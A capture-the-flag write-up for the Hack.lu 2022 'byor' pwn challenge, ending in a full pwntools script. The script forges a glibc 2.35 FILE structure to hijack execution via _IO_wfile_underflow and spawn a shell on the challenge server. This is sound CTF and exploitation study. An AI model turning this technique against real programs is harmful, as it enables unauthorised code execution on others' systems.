## byor
was a pwn challenge from Hack.lu 2022 edition

the challenge give us a leak of stdout address in libc

and permit us to overwrite `stdout`.

the goal was to bypass all new protections in libc-2.35 to revive FSOP code execution..

kylebot made some wonderfull research on this task,

by exploring the various path to achieve code execution with angr,

I recommend to read his blog --> [https://blog.kylebot.net/2022/10/22/angry-FSROP/](https://blog.kylebot.net/2022/10/22/angry-FSROP/)

and also the roderick write-ups `house of apple` 1,2 and 3 are great explanation of the attacks and the path taken (too bad I find them after the ctf only...)

![https://www-roderickchan-cn.translate.goog/post/house-of-apple](https://www-roderickchan-cn.translate.goog/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=fr)

most of the path he found were using `_wide_data` structure to achieve code execution.

so this challenge overwrite `_wide_data` and we have to found a another way to get code execution

a quick look at the reverse:

![](https://github.com/nobodyisnobody/write-ups/raw/main/Hack.lu.CTF.2022/pwn/byor/pics/reverse.png)


working with teammate VoidMercy, and UDP, we found a path via `_IO_wfile_underflow`

and here is the solution to this task..


```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("./byor_patched")
libc = ELF("./libc.so.6")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

host, port = "flu.xxx", "11801"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

libc.address = int(rcu(': ', '\n'),16)-libc.sym['_IO_2_1_stdout_']
logbase()

# some constants
stdout_lock = libc.address + 0x21ba70	# _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x0000000000163830 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

p.send(bytes(fake))
# enjoy shell
p.interactive()
```

